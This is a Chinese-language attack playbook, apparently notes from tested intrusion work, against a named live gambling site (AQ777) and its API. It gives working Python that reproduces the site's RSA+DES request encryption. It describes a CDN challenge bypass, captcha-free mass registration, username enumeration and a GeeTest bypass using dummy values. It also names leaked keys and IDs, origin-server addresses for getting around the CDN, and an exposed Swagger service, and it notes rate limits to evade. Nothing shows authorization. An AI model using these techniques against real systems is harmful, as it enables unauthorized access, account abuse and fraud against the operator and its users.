# AQ777(aq777c1.vip)WPS 系 RSA+DES 加密 API 实战

菲律宾白标博彩 AQ777,EdgeOne CDN,Vue SPA,`/wps/*` REST API 双层加密。2026-08 实测。

## 侦察摘要
- 域名 gz778.aq777c1.vip → CNAME `3pkr533q98lw.aq777c1.vip.eo.dnse5.com` → 43.174.196.140(TencentEdgeOne)
- 首页 HTML 仅入口:`/res/js/app.490c28f.js`(445KB)、`/res/js/vendor.0.59a2d00.js`(1.8MB)、`/res/encrypt.js`(72KB 混淆 CryptoJS+RSA)、17 个路由 chunk(`Agent/Member/index/...`)
- EdgeOne JS 挑战:curl / Node https 拿 `/res/*` 和 API 返回 567 挑战页;**Python urllib + CookieJar 直接过**(同 UA,差异在 TLS 指纹/HTTP 栈)。所有探测、JS 下载走 Python。
- API 字典:webpack 模块 `PKPb`(app.js)与 vendor.js 内 `t.a={...}` 定义,含 `link` + `modID` + `encrypt:!0` 标记;`4gpj` = HTTP client(X0rp 模块 `l` 导出),拦截器自动加 `Merchant/Device/Language` 头。

## 端点地图(关键)
- `POST /wps/session/login`(encrypt) | `PUT /wps/member/register`(encrypt,无验证码) | `PUT /wps/member/register/mobile`
- `GET /wps/system/whitelabel`(公开,278 模块开关) | `GET /wps/system/domainRoute`(公开!47 个运营域名全量)
- `GET /wps/system/settings/consolidated`(token;Firebase/GEETEST/APK/客服配置)
- `GET /wps/session/key/rsa`(公开,1024-bit RSA 公钥 hex,256 字符)
- `GET /wps/member/info`、`GET /wps/v2/wallets/balance`、`GET /wps/member/info/funds/consolidated`(token)
- `/wps/relay/*` 61 个中继,多数功能被白标裁剪返回 `function.not.available`

## 加密链(完整复刻)
1. `GET /wps/session/key/rsa` → modulus hex
2. rand = rndString():16 字符,字符集 `0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz`(注意字符集本身不含 V,是目标特有的)
3. RSA 密文 = rsaEncryptV2(modulus, rand[::-1]) ← **反转!**
   - little-endian:明文按 chunkSize=2*biHighIndex(modulus)=126 分组,每 2 字节组 16bit word(低字节在前)
   - num = Σ word<<(16*i);c = pow(num, 0x10001, n)
   - 输出 hex(每 word 4 字符、去前导零到 4 对齐),各 chunk 用空格连接
4. DES 密文 = **DES-ECB**(key=rand[:8], Pkcs7)← **ECB 不是 CBC!**
5. 请求:header `Encryption: <RSA hex>` + body `{"value":"<DES base64>"}`,Content-Type application/json
6. 附加头:`Merchant: as888tlbf7`(app.js 2dvV 模块 `brand.merchant`!)、`Device: web`、`Language`、登录后 `Authorization: <token>`

混淆字符串动态解码(关键):静态提取的字符串表被 rotor 旋转,索引对不上;Node vm 加载 encrypt.js 后调用 `a0_0x55e8(idx)` 拿真实值:
- `0x175="10001"`、`0x198="ECB"`、`0x1cd="split"`、`0x1c2="reverse"`、`0x15f="join"`、`0x1a8="mode"`、`0x1a0="Pkcs7"`
- 误判 CBC 会一直 `decryption.err`;改 ECB 后立即通过(返回业务错误而非解密错误)

Python 核心实现:
```python
def rsa_encrypt(modulus_hex, plaintext):
    n = int(modulus_hex, 16); e = 0x10001
    words = [int(modulus_hex[i*4:i*4+4], 16) for i in range(len(modulus_hex)//4)]
    hi = len(words) - 1
    while hi >= 0 and words[hi] == 0: hi -= 1
    chunk = 2 * hi
    data = [ord(c) for c in plaintext] + [0] * (-len(plaintext) % chunk)
    out = []
    for s in range(0, len(data), chunk):
        num = 0
        for i in range(0, chunk, 2):
            num |= (data[s+i] + (data[s+i+1] << 8)) << (16 * (i // 2))
        c = format(pow(num, e, n), 'x')
        if len(c) % 4: c = c.zfill((len(c)//4 + 1) * 4)
        out.append(c)
    return ' '.join(out)

def des_encrypt(json_str, rand):
    from Crypto.Cipher import DES
    from Crypto.Util.Padding import pad
    import base64
    return base64.b64encode(
        DES.new(rand.encode()[:8], DES.MODE_ECB).encrypt(pad(json_str.encode(), 8))
    ).decode()

# body = {'value': des_encrypt(json.dumps(data, separators=(',', ':')), rand)}
# headers['Encryption'] = rsa_encrypt(modulus, rand[::-1])
```

loginDeviceId(注册/登录必带):`MD5(f"{int(time.time()*1000)}-{uuid4()}")` → 8-4-4-4-12 UUID 格式(36 位)。

## 漏洞利用链(全部实测)
1. **无验证码批量注册**:`PUT /wps/member/register` body {username(6-13 字母数字), password(6-12 字母数字), confirmPassword, registerMethod:"WEB", loginDeviceId} → success,返回 customerId(**自增**,几分钟内 489495999→489497356 = 活跃平台)
2. **用户枚举**:重复注册返回 `exists.username.err`;新用户名 success
3. **geetest v4 绕过**:登录带 `geetestChallenge/geetestValidate/geetestSeccode` 任意字符串(如 "x")即通过;不带则 `geetest_captcha_err`
4. 登录成功 → token(UUID)→ member/info、balance、KYC 等
5. **域名矩阵**:`/wps/system/domainRoute` → 47 个运营域名(aq777c3/c4/...vip、w11.com、v1.cc...)
6. **配置泄露**:settings/consolidated → Firebase projectId `aq777-8c909` + API key、GEETEST_ID `56c71db2d7ebfaa718fbb00171c8dfb3`、APK 下载 URL、客服加密路径(可用 desDecrypt 解出真实 Telegram/Facebook/livechat)
7. **源站直连**:www2.854819.com:42666/443/80 全开(CDN 绕过候选)

## APK 补充攻击面
- settings 泄露 APK URL → 下载 7.4MB APK,Python zipfile 解包
- `assets/offline/encrypt.js`(旧版 35KB,与 web 版不同)、`vendor.encrypt.v2.dll.js`(React Native bundle)、`assets/app.json`(模板旧商户 dingtsaiyl)
- classes.dex 硬编码:`www.gfbwff.com/api/app/latest?os=android`(更新检查)、`api.twibida.com`(Hipush 推送)、`as888tlbf7.com`
- `api.twibida.com`(8.211.59.96)= Spring Boot Hipush,**Swagger 公开**(`/v2/api-docs`、`/v3/api-docs`、`/swagger-resources` 200):`POST /v1/instance/{appId}/topics`、`POST /v2/instance/{appId}/report`(设备上报)等;需 appId 才能深入

## 注意(已验证的边界)
- 交易明细 `ODSFE2_MemTransDet`:GET `page=1&size=20&startTime=<ms>&endTime=<ms>`,30 天窗口(超出报 `date_interval_30days`);新号无记录
- member/info、KYC status、PlayerRankProgress 忽略传入 customerId(无简单 IDOR)
- 登录密码错误统一 `not.exists.user`(登录侧不可枚举,注册侧可)
- relay 资金/转账/代理接口大多"功能维护中"(白标裁剪,非未授权)
- **移动端 bundle(`/m/agent` 独立 React 包)暴露更多接口面**(代理下线/绑卡/提现/资料更新/check-username),但代理接口需代理身份(type∈[1,2,41,42]),客户端提权(`POST /wps/member/info {"type":1}`)被服务端忽略。详见 `aq777-wps-api-family.md`
- **风控**:注册 ~9 个/小时触发 IP 限频,登录失败 5 次锁号,连续登录测 IP 被限。不做撞库(用户偏好 + 有锁)
